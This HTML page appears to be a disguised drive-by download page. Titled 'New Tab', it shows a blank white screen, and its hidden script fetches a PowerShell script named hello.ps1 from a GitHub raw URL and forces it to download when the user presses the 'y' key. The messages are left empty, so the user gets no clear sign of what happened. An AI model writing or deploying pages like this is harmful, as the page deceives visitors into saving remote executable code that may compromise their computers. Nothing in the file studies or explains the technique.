<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Tab</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        
        .message {
            color: #333;
            font-size: 18px;
            text-align: center;
            max-width: 80%;
            line-height: 1.5;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="message">
    </div>

    <script>
    // Track the sequence of keys pressed
    let keySequence = [];
    const targetSequence = ['y'];

    // Function to trigger downloadg
    async function downloadHelloPS() {
    try {
        const fileUrl = "https://raw.githubusercontent.com/amir123104/hello/main/hello.ps1";
        const message = document.querySelector('.message');
        
        message.textContent = "";
        
        const response = await fetch(fileUrl);
        if (!response.ok) {
            throw new Error('HELLO');
        }
        
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = "hello.ps1";
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        message.textContent = "";
        setTimeout(() => {
            message.textContent = "";
        }, 3000);
        
    } catch (error) {
        console.error('Download failed:', error);
        const message = document.querySelector('.message');
        message.textContent = "HELLO";
        setTimeout(() => {
            message.textContent = "";
        }, 3000);
    }
}

    // Listen for key presses
    document.addEventListener('keydown', (event) => {
        if (event.key.length === 1 && /[a-z]/i.test(event.key)) {
            keySequence.push(event.key.toLowerCase());

            if (keySequence.length > targetSequence.length) {
                keySequence.shift();
            }

            if (keySequence.join('') === targetSequence.join('')) {
                downloadHelloPS();
                keySequence = [];
            }
        }
    });
</script>
</body>
</html>
